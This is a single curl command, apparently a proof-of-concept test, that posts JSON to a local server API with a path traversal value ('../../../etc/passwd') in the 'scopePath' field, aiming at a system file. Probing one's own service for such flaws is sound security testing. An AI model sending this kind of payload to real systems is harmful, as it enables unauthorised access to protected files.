curl -X POST http://localhost:3001/api/servers \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "config": {"command": "echo"}, "scope": "project", "scopePath": "../../../etc/passwd"}'
